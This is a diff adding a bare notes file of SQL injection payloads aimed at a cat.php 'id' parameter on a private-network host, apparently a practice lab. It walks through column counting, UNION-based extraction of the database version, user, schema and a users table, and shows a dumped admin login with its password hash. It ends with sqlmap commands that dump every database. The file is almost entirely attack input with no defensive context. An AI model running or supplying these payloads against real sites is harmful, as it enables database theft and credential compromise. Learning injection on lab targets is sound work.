@@ -1,0 +1,35 @@
+
+Commands to try.
+
+http://192.168.0.5/cat.php?id=1'
+http://192.168.0.5/cat.php?id=1 order by 1
+http://192.168.0.5/cat.php?id=1 order by 2
+http://192.168.0.5/cat.php?id=1 order by 3
+http://192.168.0.5/cat.php?id=1 order by 4
+http://192.168.0.5/cat.php?id=1 order by 5 (error)
+http://192.168.0.5/cat.php?id=-1 union select 1,2,3,4
+http://192.168.0.5/cat.php?id=-1 union select 1,@@version,3,4
+http://192.168.0.5/cat.php?id=-1 union select 1,user(),3,4
+http://192.168.0.5/cat.php?id=-1 union select 1,table_name,3,4 from information_schema.tables
+http://192.168.0.5/cat.php?id=-1 union select 1,column_name,3,4 from information_schema.columns where table_name='users' http://192.168.0.5/cat.php?id=-1 union select 1,concat(id,0x3a,login,0x3a,password),3,4 from users 1:admin:8efe310f9ab3efeae8d410a8e0166eb2
+
+
+http://192.168.0.5/cat.php?id=1%20UNION%20SELECT%20null
+http://192.168.0.5/cat.php?id=1%20UNION%20SELECT%20null,null
+http://192.168.0.5/cat.php?id=1%20UNION%20SELECT%20null,null,null
+http://192.168.0.5/cat.php?id=1%20UNION%20SELECT%20null,null,null,null
+
+
+You can for example access the following URL's to retrieve this information:
+
+the database version:  http://192.168.0.5/cat.php?id=1%20UNION%20SELECT%201,@@version,3,4
+the current user: http://192.168.0.5/cat.php?id=1%20UNION%20SELECT%201,current_user(),3,4
+the current database: http://192.168.0.5/cat.php?id=1%20UNION%20SELECT%201,database(),3,4
+
+
+sqlmap -u "http://192.168.0.5/cat.php?id=1" --dbs
+sqlmap -u "http://192.168.0.5/cat.php?id=1" --tables
+sqlmap -u "http://192.168.0.5/cat.php?id=1" --columns
+sqlmap -u "http://192.168.0.5/cat.php?id=1" --dump
+sqlmap -u “http://192.168.0.5/cat.php?id=1” –D photoblog --dump-all
+
